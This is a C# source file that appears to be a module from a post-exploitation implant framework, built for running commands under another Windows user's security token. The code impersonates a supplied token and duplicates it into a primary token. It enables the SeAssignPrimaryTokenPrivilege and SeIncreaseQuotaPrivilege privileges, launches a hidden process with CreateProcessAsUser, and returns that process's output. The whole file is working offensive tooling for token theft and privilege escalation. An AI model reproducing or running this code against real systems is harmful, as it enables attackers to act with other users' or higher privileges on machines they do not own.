using System;
using System.IO;
using System.Text;
using System.Security;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Security.Principal;

using System.Diagnostics;
using System.ComponentModel;


public class Module_execute_with_token
{
    public const string SUCC_CODE       = "0";
    public const string ERR_CODE        = "1";
    public const string NON_TOKEN_VALUE = "0";

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    private void ImpersonateWithToken(string token)
    {
        int token_int = Int32.Parse(token);
        IntPtr targetToken = new IntPtr(token_int);

        string current_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            current_username = wid.Name;
        }

        if (!ImpersonateLoggedOnUser(targetToken))
        {
            var errorCode = Marshal.GetLastWin32Error();
            throw new Exception("ImpersonateLoggedOnUser failed with the following error: " + errorCode);
        }

        string impersonate_username = "";
        using (WindowsIdentity wid = WindowsIdentity.GetCurrent())
        {
            impersonate_username = wid.Name;
        }

        if (current_username == impersonate_username)
            throw new Exception("ImpersonateLoggedOnUser worked, but thread running as user " + current_username);
    }

    private string hex2Str(string hex)
    {
        byte[] raw = new byte[hex.Length / 2];
        for (int i = 0; i < raw.Length; i++)
        {
            raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }
        return Encoding.ASCII.GetString(raw);
    }

    private string normalizePath(string currPath)
    {
        currPath = currPath.Replace("\"", "");
        currPath = currPath.Replace("'", "");
        currPath = currPath.Replace(@"\", "/");
        return currPath;
    }

    private string changeCWD(string cwd)
    {
        try
        {
            Directory.SetCurrentDirectory(cwd);
            return normalizePath(Directory.GetCurrentDirectory());
        }
        catch (Exception ex)
        {
            if (ex is IOException)
                throw new Exception("Path '" + cwd + "' is not a directory");
            else if (ex is DirectoryNotFoundException)
                throw new Exception("Directory '" + cwd + "' does not exist");
            else if (ex is SecurityException)
                throw new Exception("Directory '" + cwd + "' permission denied");
            else if (ex is PathTooLongException)
                throw new Exception("Path '" + cwd + "' exceed the maximum length defined by the system");
            else
                throw new Exception("Move to path '" + cwd + "' failed");
        }
    }

    private string[] parseArguments(string args)
    {
        List<string> arguments_parsed = new List<string>();
        string pattern = @"""[^""]+""|'[^']+'|\S+";
        foreach (Match m in Regex.Matches(args, pattern))
        {
            arguments_parsed.Add(m.Value);
        }
        return arguments_parsed.ToArray();
    }

    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
    public const int SE_PRIVILEGE_REMOVED = 0x00000004;

    public const uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;
    public const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
    public const uint TOKEN_DUPLICATE = 0x0002;
    public const uint TOKEN_IMPERSONATE = 0x0004;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint TOKEN_QUERY_SOURCE = 0x0010;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_ADJUST_GROUPS = 0x0040;
    public const uint TOKEN_ADJUST_DEFAULT = 0x0080;
    public const uint TOKEN_ADJUST_SESSIONID = 0x0100;
    public const uint TOKEN_ELEVATION = TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY;

    [Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct TokPriv1Luid
	{
	    public int Count;
	    public long Luid;
	    public int Attr;
	}

    [StructLayout(LayoutKind.Sequential)]
	public struct SECURITY_ATTRIBUTES
	{
	    public int nLength;
	    public IntPtr lpSecurityDescriptor;
	    public int bInheritHandle;
	}
	
	public enum TOKEN_TYPE
	{
	    TokenPrimary = 1,
	    TokenImpersonation
	}
	
	public enum SECURITY_IMPERSONATION_LEVEL
	{
	    SecurityAnonymous,
	    SecurityIdentification,
	    SecurityImpersonation,
	    SecurityDelegation
	}

    public enum CreationFlags
	{
	    NoConsole = 0x08000000,
        None = 0x00000000
	}

    public enum LogonFlags
	{
	    WithProfile = 1,
	    NetCredentialsOnly
	}

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    
    [DllImport("advapi32", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        TokenAccessLevels DesiredAccess,
        out IntPtr TokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool LookupPrivilegeValue(
        string host,
        string name,
        ref long pluid);
    
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
	public static extern bool AdjustTokenPrivileges(
        IntPtr htok,
        bool disall,
        ref TokPriv1Luid newst,
        int len,
        IntPtr prev,
        IntPtr relen);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        uint processAccess,
        bool bInheritHandle,
        IntPtr processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool CloseHandle(
        IntPtr hObject);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool DuplicateTokenEx(
	    IntPtr hExistingToken,
	    uint dwDesiredAccess,
	    ref SECURITY_ATTRIBUTES lpTokenAttributes,
	    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
	    TOKEN_TYPE TokenType,
	    out IntPtr phNewToken);
    
    [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
	public static extern bool CreateProcessWithTokenW(
        IntPtr hToken,
        LogonFlags dwLogonFlags,
        string lpApplicationName,
        string lpCommandLine,
        CreationFlags dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);
    
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
	public static extern bool CreateProcessAsUser(
        IntPtr hToken,
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        CreationFlags dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr CreatePipe(
        ref IntPtr hReadPipe,
        ref IntPtr hWritePipe,
        ref SECURITY_ATTRIBUTES lpPipeAttributes,
        Int32 nSize);
	
    [DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool SetHandleInformation(
        IntPtr hObject,
        int dwMask,
        int dwFlags);

    [DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool ReadFile(
        IntPtr hFile,
        byte[] lpBuffer,
        int nNumberOfBytesToRead,
        ref int lpNumberOfBytesRead,
        IntPtr lpOverlapped);

    private bool IsNumeric(string s)
    {
        int n;
        return int.TryParse(s, out n);
    }

    private bool SetPrivilege(IntPtr htok, string PrivilegeName, bool EnableDisable)
    {
        TokPriv1Luid tp;
        tp.Luid = 0;
        tp.Count = 1;

        if (!LookupPrivilegeValue(null, PrivilegeName, ref tp.Luid))
        {
            var errorCode = Marshal.GetLastWin32Error();
            throw new Exception("LookupPrivilegeValue failed with the following error: " + errorCode);
        }

        if (EnableDisable)
            tp.Attr = SE_PRIVILEGE_ENABLED;
        else
            tp.Attr = SE_PRIVILEGE_REMOVED;

        if (!AdjustTokenPrivileges(htok, false, ref tp, 256, IntPtr.Zero, IntPtr.Zero))
        {
            var errorCode = Marshal.GetLastWin32Error();
            throw new Exception("LookupPrivilegeValue failed with the following error: " + errorCode);
        }

        return true;
    }

    private string[] doExecuteWithToken(string token, string executor, string arguments)
    {
        string result = "";

        try
        {
            IntPtr duplicateTokenHandle = IntPtr.Zero;

            if (IsNumeric(token) == false)
                return new string[]{ERR_CODE, "invalid token '" + token + "': not a number" + Environment.NewLine};
            
            int mod_token_int = Int32.Parse(token);
            IntPtr tokenHandle = new IntPtr(mod_token_int);

            var securityAttr = new SECURITY_ATTRIBUTES();
            if (!DuplicateTokenEx(tokenHandle, 
                                    TOKEN_ELEVATION,
                                    ref securityAttr,
                                    SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                                    TOKEN_TYPE.TokenPrimary,
                                    out duplicateTokenHandle))
            {
                CloseHandle(tokenHandle);
                var errorCode = Marshal.GetLastWin32Error();
                throw new Exception("DuplicateTokenEx failed with the following error: " + errorCode);
            }

            result += "[+] DuplicateTokenEx() successfull obtain primary token from target process" + Environment.NewLine;

            var si = new STARTUPINFO();
	        var pi = new PROCESS_INFORMATION();
            SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
            saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
            saAttr.bInheritHandle = 0x1;
            saAttr.lpSecurityDescriptor = IntPtr.Zero;
            
            IntPtr out_read = IntPtr.Zero;
            IntPtr out_write = IntPtr.Zero;
            IntPtr err_read = IntPtr.Zero;
            IntPtr err_write = IntPtr.Zero;
            
            CreatePipe(ref out_read, ref out_write, ref saAttr, 0);
            CreatePipe(ref err_read, ref err_write, ref saAttr, 0);
            SetHandleInformation(out_read, 0x00000001, 0);
            SetHandleInformation(err_read, 0x00000001, 0);

            result += "[+] CreatePipe() successfull create pipes to get stdout/stderr from new process" + Environment.NewLine;

            si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            si.hStdOutput = out_write;
            si.hStdError = err_write;
            si.dwFlags |= 0x00000100;

            string filename = executor;
            string fileargs = arguments;

            IntPtr htok = IntPtr.Zero;
            Process currentProcess = Process.GetCurrentProcess();
            var target_proc_handle = currentProcess.Handle;
            if (!OpenProcessToken(target_proc_handle, TokenAccessLevels.Query | TokenAccessLevels.AdjustPrivileges | TokenAccessLevels.AssignPrimary, out htok))
            {
                var errorCode = Marshal.GetLastWin32Error();
                throw new Exception("OpenProcessToken failed with the following error: " + errorCode);
            }

            SetPrivilege(htok, "SeAssignPrimaryTokenPrivilege", true);
            SetPrivilege(htok, "SeIncreaseQuotaPrivilege", true);
            CloseHandle(htok);

            if (!CreateProcessAsUser(duplicateTokenHandle,
                                            filename,
                                            fileargs,
                                            IntPtr.Zero,
                                            IntPtr.Zero,
                                            true,
                                            CreationFlags.NoConsole,
                                            IntPtr.Zero,
                                            Path.GetDirectoryName(filename),
                                            ref si,
                                            out pi))
            {
                CloseHandle(tokenHandle);
                CloseHandle(duplicateTokenHandle);
                var errorCode = Marshal.GetLastWin32Error();
                throw new Exception("CreateProcessAsUser failed with the following error: " + errorCode);
            }

            result += "[+] CreateProcessAsUser() successfull launch new process" + Environment.NewLine;
            result += Environment.NewLine;

            CloseHandle(out_write);
	        CloseHandle(err_write);

            byte[] buf = new byte[4096];
            int dwRead = 0;
            while (true)
            {
                bool bSuccess = ReadFile(out_read, buf, 4096, ref dwRead, IntPtr.Zero);
                if (!bSuccess || dwRead == 0)
                    break;
                result += System.Text.Encoding.Default.GetString(buf);
                buf = new byte[4096];
            }
            
            CloseHandle(out_read);
	        CloseHandle(err_read);

            CloseHandle(tokenHandle);
            CloseHandle(duplicateTokenHandle);
        }
        catch (Exception ex)
        {
            result += ex.ToString() + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        return new string[]{SUCC_CODE, result};
    }

    public string[] execute(string[] args)
    {
        string result = "";
        List<string> nargs = new List<string>(args);
		
        if (nargs.Count < 2)
        {
            result = "Invalid arguments provided. Specify pid, executor and arguments" + Environment.NewLine;
            return new string[]{ERR_CODE, result};
        }

        string pid = nargs[0];
        string executor = nargs[1];
        List<string> commands = new List<string>(nargs);
        commands.RemoveAt(0);
        commands.RemoveAt(0);

        string[] commands_arr = commands.ToArray();

        return doExecuteWithToken(pid, executor, String.Join(" ", commands_arr));
    }

    public string[] go(string cwd, string args, string token)
    {
        string[] results = new string[]{SUCC_CODE, ""};
        string pwd = Directory.GetCurrentDirectory();

        try
        {
            if (token != NON_TOKEN_VALUE)
                ImpersonateWithToken(token);

            string new_cwd = changeCWD(cwd);
            string[] arguments_parsed = parseArguments(hex2Str(args));
            
            results = execute(arguments_parsed);
        }
        catch (Exception ex)
        {
            results[0] = ERR_CODE;
            results[1] = ex.ToString();
        }
        finally
        {
            changeCWD(pwd);
            if (token != NON_TOKEN_VALUE)
                RevertToSelf();
        }
        return results;
    }

    public static void Main(string[] args)
    {
        Module_execute_with_token m = new Module_execute_with_token();
        String[] results = m.execute(args);
        Console.WriteLine(results[0]);
        Console.WriteLine(results[1]);
        return;
    }
}